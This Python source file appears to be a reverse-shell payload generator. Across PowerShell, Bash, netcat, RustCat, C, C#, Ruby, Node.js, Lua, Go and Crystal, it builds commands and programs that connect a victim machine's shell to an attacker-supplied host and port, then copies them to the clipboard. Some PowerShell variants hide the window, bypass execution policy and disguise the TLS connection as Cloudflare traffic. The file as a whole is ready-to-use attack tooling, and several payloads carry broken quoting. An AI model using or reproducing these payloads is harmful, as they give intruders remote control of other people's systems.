import pyperclip

def __getReady(some: str = ""):    
        n = "\ n".replace(" ", "")
        pyperclip.copy(some.replace("\n", n))

class Powershell(object):
    def __init__(self, version: int = 1):
        self.vr = version

    def makePrepare(self, host: str, port: str):
        bx = "$Output`n"
        PS = 'PS '
        LIL = "> "
        SHELL = "SHELL> "
        cloudFlare = "cloudflare-dns.com"

        if 1 <= self.vr <= 4:
            if self.vr == 1:
                try:
                    data = "$LHOST = "+host+"; $LPORT = "+port+"; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("+bx+"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
                    pyperclip.copy(data)
                    return {"is_copy": True, "data": data}
                except Exception as ERROR_COPY:
                    return {"is_copy": False, "base": ERROR_COPY, "data": data}
            
            elif self.vr == 2:
                try:
                    data = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("'+host+'",'+port+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '+PS+' + (pwd).Path + '+LIL+';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
                    pyperclip.copy(data)
                    return {"is_copy": True, "data": data}
                except Exception as ERROR_COPY:
                    return {"is_copy": False, "base": ERROR_COPY, "data": data}

            elif self.vr == 3:
                try:
                    data = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("'+host+'", '+port+');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + '+SHELL+');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'
                    pyperclip.copy(data)
                    return {"is_copy": True, "data": data}
                except Exception as ERROR_COPY:
                    return {"is_copy": False, "base": ERROR_COPY, "data": data}
                
            elif self.vr == 4:
                try:
                    data = '$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient("'+host+'", '+port+');$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('+cloudFlare+',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + '+SHELL+');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'
                    pyperclip.copy(data)
                    return {"is_copy": True, "data": data}
                except Exception as ERROR_COPY:
                    return {"is_copy": False, "base": ERROR_COPY, "data": data}


class Bash(object):
    def tcp(host: str, port: str):
        try:
            data = f'sh -i >& /dev/tcp/{host}/{port} 0>&1'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def udp(host: str, port: str):
        try:
            data = f'sh -i >& /dev/udp/{host}/{port} 0>&1'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def dev196(host: str, port: str):
        try:
            data = f'0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def readline(host: str, port: str):
        try:
            data = f'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def bash5(host: str, port: str):
        try:
            data = f'sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def curl(host: str, port: str):
        try:
            data = f"C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null"
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class NetCat(object):
    def regular(host: str, port: str):
        try:
            data = f'nc {host} {port} -e sh'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def exe(host: str, port: str):
        try:
            data = f'nc.exe {host} {port} -e sh'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def busyBox(host: str, port: str):
        try:
            data = f'busybox nc {host} {port} -e sh'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def executer(host: str, port: str):
        try:
            data = f'nc -c sh {host} {port}'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def backdoor(host: str, port: str):
        try:
            data = f'ncat {host} {port} -e sh'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def udp(host: str, port: str):
        try:
            data = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {host} {port} >/tmp/f'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class RustCat(object):
    def makePay(host: str, port: str):
        try:
            data = f'rcat connect -s sh {host} {port}'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}

class C(object):
    def source(host: str, port: str):
        SH = "sh"

        try:
            data = "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n\nint port = "+port+";\nstruct sockaddr_in revsockaddr;\nint sockt = socket(AF_INET, SOCK_STREAM, 0);\nrevsockaddr.sin_family = AF_INET;\nrevsockaddr.sin_port = htons(port);\nrevsockaddr.sin_addr.s_addr = inet_addr('"+host+"');\nconnect(sockt, (struct sockaddr *) &revsockaddr,\nsizeof(revsockaddr));\ndup2(sockt, 0);\ndup2(sockt, 1);\ndup2(sockt, 2);\nchar * const argv[] = {'"+SH+"', NULL};\nexecvp('"+SH+"', argv);\nreturn 0;\n}"
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def windowsSource(host: str, port: str):
        CMD = "cmd.exe"
        ws2_32 = "ws2_32"

        try:
            data = "#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,"+ws2_32+")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax; \nchar ip_addr[16] = '"+host+"'; \nchar port[6] = '"+port+"';            \n\nSTARTUPINFO ini_processo;\n\nPROCESS_INFORMATION processo_info;\n\nint main()\n{\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n\n\n    struct hostent *host; \n    host = gethostbyname(ip_addr);\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\n\n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(atoi(port));\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\n\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n\n    memset(&ini_processo, 0, sizeof(ini_processo));\n    ini_processo.cb = sizeof(ini_processo);\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n    TCHAR cmd[255] = TEXT('"+CMD+"');\n\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n\n    return 0;\n}\n"
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}

class CSharp(object):
    def tcp(host: str, port: str):
        try:
            data = 'using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n	public class Program\n	{\n		static StreamWriter streamWriter;\n\n		public static void Main(string[] args)\n		{\n			using(TcpClient client = new TcpClient("'+host+'", '+port+'))\n			{\n				using(Stream stream = client.GetStream())\n				{\n					using(StreamReader rdr = new StreamReader(stream))\n					{\n						streamWriter = new StreamWriter(stream);\n						\n						StringBuilder strInput = new StringBuilder();\n\n						Process p = new Process();\n						p.StartInfo.FileName = "sh";\n						p.StartInfo.CreateNoWindow = true;\n						p.StartInfo.UseShellExecute = false;\n						p.StartInfo.RedirectStandardOutput = true;\n						p.StartInfo.RedirectStandardInput = true;\n						p.StartInfo.RedirectStandardError = true;\n						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n						p.Start();\n						p.BeginOutputReadLine();\n\n						while(true)\n						{\n							strInput.Append(rdr.ReadLine());\n							//strInput.Append("\n");\n							p.StandardInput.WriteLine(strInput);\n							strInput.Remove(0, strInput.Length);\n						}\n					}\n				}\n			}\n		}\n\n		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n	}\n}\n\n'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
    def bash(host: str, port: str):
        try:
            data = 'using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n	public static void Main(string[] args) {\n	  Process proc = new System.Diagnostics.Process();\n	  proc.StartInfo.FileName = "sh";\n	  proc.StartInfo.Arguments = "-c "sh -i >& /dev/tcp/'+host+'/'+port+' 0>&1"";\n	  proc.StartInfo.UseShellExecute = false;\n	  proc.StartInfo.RedirectStandardOutput = true;\n	  proc.Start();\n\n	  while (!proc.StandardOutput.EndOfStream) {\n		Console.WriteLine(proc.StandardOutput.ReadLine());\n	  }\n	}\n  }\n}\n\n'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}

class Ruby(object):
    def regular(host: str, port: str):
        try:
            data = f'''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{host}",{port}))' '''
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
    
    def noSh(host: str, port: str):
        src = """{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}"""
        try:
            data = f"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("{host}","{port}");loop{src}'"""
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class NodeJS(object):
    def netCatStealer(host: str, port: str):
        try:
            data = f"""require('child_process').exec('nc -e sh {host} {port}')"""
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
    
    def socketWorker(host: str, port: str):
        try:
            data = '\n(function(){\n    var net = require("net"),\n        cp = require("child_process"),\n        sh = cp.spawn("sh", []);\n    var client = new net.Socket();\n    client.connect('+port+', "'+host+'", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/;})();'
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class Lua(object):
    def socketWorker(host: str, port: str):
        try:
            data = f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('sh -i <&3 >&3 2>&3');" """
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
    
    def socketWorkerV2(host: str, port: str):
        try:
            data = f"""lua5.1 -e 'local host, port = "{host}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class GoLang(object):
    def socketWorker(host: str, port: str):
        os_exec = "os/exec"
        net = "net"
        tcp = "tcp"
        beReady = f"{host}:{port}"
        sh = "sh"

        try:
            data = "echo 'package main;import"+os_exec+";import"+net+";func main(){c,_:=net.Dial("+tcp+","+beReady+");cmd:=exec.Command("+sh+");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}
        
class Crystal(object):
    def socketWorker(host: str, port: str):
        n = "\ n".replace(" ", "")
        process = "process"
        SOCKET = "socket"

        try:
            data = "crystal eval 'require "+process+";require "+SOCKET+";c=Socket.tcp(Socket::Family::INET);c.connect('"+host+"', "+port+");loop{m,l=c.receive;p=Process.new(m.rstrip('"+n+"'),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'"
            pyperclip.copy(data)
            return {"is_copy": True, "data": data}
        except Exception as ERROR_COPY:
            return {"is_copy": False, "base": ERROR_COPY, "data": data}